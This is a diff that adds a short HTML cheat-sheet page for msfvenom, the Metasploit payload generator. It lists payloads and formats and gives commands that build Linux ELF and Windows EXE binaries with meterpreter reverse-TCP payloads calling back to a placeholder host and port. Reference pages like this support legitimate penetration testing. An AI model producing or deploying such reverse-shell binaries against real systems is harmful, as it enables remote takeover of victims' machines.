@@ -1,0 +1,17 @@
+<b>msfvenom</b><br><br>
+<b>Manually generate payloads for metasploit.</b><br><br><b>More information: <a href="https://github.com/rapid7/metasploit-framework/wiki/How-to-use-msfvenom">home page</a></b><br><br>
+- List payloads:
+
+<blockquote>msfvenom -l payloads</blockquote>
+- List formats:
+
+<blockquote>msfvenom -l formats</blockquote>
+- Show payload options:
+
+<blockquote>msfvenom -p <i>payload</i> --list-options</blockquote>
+- Create an ELF binary with a reverse TCP handler:
+
+<blockquote>msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<i>local_ip</i> LPORT=<i>local_port</i> -f elf > <i>path/to/binary</i></blockquote>
+- Create an EXE binary with a reverse TCP handler:
+
+<blockquote>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<i>local_ip</i> LPORT=<i>local_port</i> -f exe > <i>path/to/binary.exe</i></blockquote>
